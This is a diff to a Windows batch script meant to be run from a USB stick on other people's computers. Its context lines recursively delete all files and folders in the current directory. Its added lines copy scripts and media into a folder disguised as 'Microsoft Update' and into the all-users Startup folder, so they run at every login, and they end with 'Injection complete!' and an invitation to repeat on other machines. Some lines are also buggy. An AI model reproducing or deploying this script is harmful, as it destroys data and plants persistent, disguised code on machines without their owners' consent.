@@ -11,16 +11,17 @@ for /D %%A in (*) do (
     del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
     cd ..
 )
-set "wallpaperPath=thumboi.png"
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+echo set "wallpaperPath="C:/Users/%username%/AppData/Local/Microsoft Update/thumboi.png" > "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/wallpaper.bat"
+echo reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f > "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
+echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters > "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
 cd C:/Users/%username/AppData/Local
 mkdir "Microsoft Update"
-copy funnyahhaudio.wav "C:/Users/%username%/AppData/Local/Microsoft Update"
-copy audio.bat "C:/Users/%username%/AppData/Local/Microsoft Update"
-copy hehe.vbs "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
-copy thumboi.png C:/Users/%username%/Downloads
-copy thumb.bat C:/Users/%username%/Downloads
-cd C:/Users/%username%/Downloads
-start thumb.bat
+copy "%~d0/funnyahhaudio.wav" "C:/Users/%username%/AppData/Local/Microsoft Update"
+copy "%~d0/audio.bat" "C:/Users/%username%/AppData/Local/Microsoft Update"
+copy "%~d0/hehe.vbs" "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
+copy "%~d0/thumboi.png" "C:/Users/%username%/AppData/Local/Microsoft Update"
+copy "%~d0/thumb.bat" "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
+echo Injection complete! you may shutdown, remove the usb and repeat with other computers. Press any key to exit...
+pause >nul
+
 
